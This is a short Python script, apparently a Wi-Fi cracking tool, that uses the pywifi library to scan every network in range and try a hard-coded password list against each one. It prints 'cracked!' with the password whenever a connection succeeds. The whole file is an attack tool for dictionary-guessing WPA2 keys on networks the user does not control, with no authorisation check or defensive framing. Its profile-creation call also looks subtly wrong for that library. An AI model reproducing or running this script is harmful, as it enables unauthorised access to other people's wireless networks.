from pywifi import PyWiFi, const
import time

# Function to find the password for a given network


def find_password(network, password):
    # Create a new Wi-Fi profile
    profile = PyWiFi.Profile()
    # Set the SSID of the network
    profile.ssid = network.ssid
    # Set the authentication algorithm to open
    profile.auth = const.AUTH_ALG_OPEN
    # Append WPA2-PSK as the authentication and key management type
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    # Set the cipher type to CCMP
    profile.cipher = const.CIPHER_TYPE_CCMP
    # Set the password for the network
    profile.key = password

    # Remove all existing network profiles
    iface.remove_all_network_profiles()
    # Add the new profile to the interface
    tmp_profile = iface.add_network_profile(profile)

    # Connect to the network using the new profile
    iface.connection(tmp_profile)

    # Wait for a few seconds
    time.sleep(5)

    # Check if the interface is connected
    if iface.status() == const.IFACE_CONNECTED:
        return True
    else:
        # Disconnect if not connected
        iface.disconnect()
        time.sleep(1)
        return False


# Create a PyWiFi instance
wifi = PyWiFi()
# Get the first Wi-Fi interface
iface = wifi.interfaces()[0]
# Scan for available networks
networks = iface.scan_results()
# List of passwords to try
dictionary = ['password1', 'password2', 'password3', 'password4']

# Loop through each network
for network in networks:
    print(f'testing network: {network.ssid}')
    # Loop through each password in the dictionary
    for password in dictionary:
        # Try to find the password for the network
        if find_password(network, password):
            print(
                f'cracked! the password for network:{network.ssid} is {password}')
            # Break the loop if password is found
            break
